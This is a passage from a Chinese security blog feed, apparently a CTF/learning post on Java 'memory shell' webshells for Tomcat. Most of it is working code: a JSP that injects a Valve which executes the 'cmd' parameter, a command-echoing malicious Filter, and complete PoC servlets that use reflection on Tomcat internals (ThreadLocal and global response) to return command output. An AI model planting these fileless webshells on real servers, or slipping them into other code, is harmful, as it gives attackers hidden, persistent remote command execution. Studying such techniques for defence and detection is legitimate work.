class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><p>加载Valve</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Valve.jsp<br></code></pre></td></tr></table></figure><p>之后可以任意路径命令执行</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010705853.png" alt="image-20230201070553758"></p><h2 id="0x02-内存马回显技术"><a href="#0x02-内存马回显技术" class="headerlink" title="0x02 内存马回显技术"></a>0x02 内存马回显技术</h2><h3 id="回显示例"><a href="#回显示例" class="headerlink" title="回显示例"></a>回显示例</h3><p>可以利用之前的Tomcat Filter型内存马获取回显,修改一下恶意Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br> <br>                <span class="hljs-comment">//将命令执行结果写入扫描器并读取所有输入</span><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010710660.png" alt="image-20230201071005531"></p><h3 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h3><p>实验环境:Tomcat 9.0.77 (Tomcat10后部分源码逻辑修改,以及一些反射使用会报NullPointerException)</p><p>如果用Tomcat的内存马，需要JSP文件，当我们需要反序列化漏洞来注入内存马是，需要其他的方法获取request和response对象。</p><p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在<code>org.apache.catalina.core.ApplicationFilterChain</code>类中找到这样两个变量*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationFilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FilterChain</span> &#123;<br><br>    <span class="hljs-comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><blockquote><p>并且这两个属性还是静态的,默认赋值</p></blockquote><p>在<code>ApplicationFilterChain#internalDoFilter</code>中，Tomcat会将request对象和response对象存储到这两个变量中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;<br>    lastServicedRequest.set(request);<br>    lastServicedResponse.set(response);<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p>这里有一个条件<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>,默认值为false，但可以反射修改</p></blockquote><p>总结一下思路</p><ol><li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li><li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li><li>通过<code>ThreadLocal#get</code>方法将request和response对象从*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*中取出</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br> <br><span class="hljs-meta">@WebServlet(&quot;/echo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//反射获取所需属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">WRAP_SAME_OBJECT_FIELD</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedRequestField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedResponseField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br> <br>            <span class="hljs-comment">//使用modifiersField反射修改final型变量</span><br>            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">modifiersField</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>            modifiersField.setAccessible(<span class="hljs-literal">true</span>);<br>            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<br>            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedResponseField.setAccessible(<span class="hljs-literal">true</span>);<br> <br>            <span class="hljs-comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span><br>            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="hljs-literal">null</span>))&#123;<br>                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="hljs-literal">null</span>,<span class="hljs-literal">true</span>);<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedRequestField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedRequestField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedResponseField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-comment">//获取request变量</span><br>            <span class="hljs-keyword">if</span>(lastServicedRequestField.get(<span class="hljs-literal">null</span>)!=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">ThreadLocal</span> <span class="hljs-variable">threadLocal</span> <span class="hljs-operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="hljs-literal">null</span>);<br>                <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (ServletRequest) threadLocal.get();<br>                System.out.println(servletRequest);<br>                System.out.println((HttpServletRequest) servletRequest == req);<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次请求将request和response对象存储进变量中，第二次请求才获取到request</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(servletRequest);<br>System.out.println((HttpServletRequest) servletRequest == req);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010824372.png" alt="image-20230201082439227"></p><h3 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h3><h4 id="Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources"><a href="#Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources" class="headerlink" title="Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)"></a>Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)</h4><p>在<code>AbstractProcessor</code>类中，我们能够找到全局response,在Tomcat调用栈中调用了<code>Http11Processor#service</code>方法,而<code>Http11Processor</code>继承了<code>AbstractProcessor</code>类，这里的response对象正是<code>AbstractProcessor</code>类中的属性，因此我们如果能获取到<code>Http11Processor</code>类，就能获取到response对象</p><p>调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="hljs-built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response<br></code></pre></td></tr></table></figure><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<br><span class="hljs-keyword">import</span> org.apache.coyote.ProtocolHandler;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br> <br><span class="hljs-meta">@WebServlet(&quot;/response&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo_Response</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-comment">//获取StandardService</span><br>        org.apache.catalina.loader.<span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br> <br>        System.out.println(standardContext);<br> <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取ApplicationContext</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);<br> <br>            <span class="hljs-comment">//获取StandardService</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">standardServiceField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);<br>            standardServiceField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardService</span> <span class="hljs-variable">standardService</span> <span class="hljs-operator">=</span> (StandardService) standardServiceField.get(applicationContext);<br> <br>            <span class="hljs-comment">//获取Connector</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">connectorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>);<br>            connectorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            Connector[] connectors = (Connector[]) connectorsField.get(standardService);<br>            <span class="hljs-type">Connector</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> connectors[<span class="hljs-number">0</span>];<br> <br>            <span class="hljs-comment">//获取Handler</span><br>            <span class="hljs-type">ProtocolHandler</span> <span class="hljs-variable">protocolHandler</span> <span class="hljs-operator">=</span> connector.getProtocolHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            org.apache.tomcat.util.net.AbstractEndpoint.<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);<br> <br>            <span class="hljs-comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">globalHandler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);<br>            globalHandler.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">RequestGroupInfo</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> (RequestGroupInfo) globalHandler.get(handler);<br> <br>            <span class="hljs-comment">//获取processors</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">processorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);<br>            processorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);<br> <br>            <span class="hljs-comment">//获取request和response</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);<br>            requestField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;<br> <br>                <span class="hljs-comment">//获取org.apache.coyote.Request</span><br>                org.apache.coyote.<span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);<br> <br>                <span class="hljs-comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span><br>                org.apache.catalina.connector.<span class="hljs-type">Request</span> <span class="hljs-variable">http_request</span> <span class="hljs-operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="hljs-number">1</span>);<br>                org.apache.catalina.connector.<span class="hljs-type">Response</span> <span class="hljs-variable">http_response</span> <span class="hljs-operator">=</span> http_request.getResponse();<br> <br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> http_response.getWriter();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> http_request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(inputStream).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125;<br> <br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010922036.png" alt="image-20230201092245861"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p><p><a href="https://xz.aliyun.com/t/7388#toc-2">基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com)</a></p><p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog (goodapple.top)</a></p><p><a href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/">Tomcat中一种半通用回显方法 - Kingkk’s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabby安装配置及使用</title>
      <link href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/</url>
      
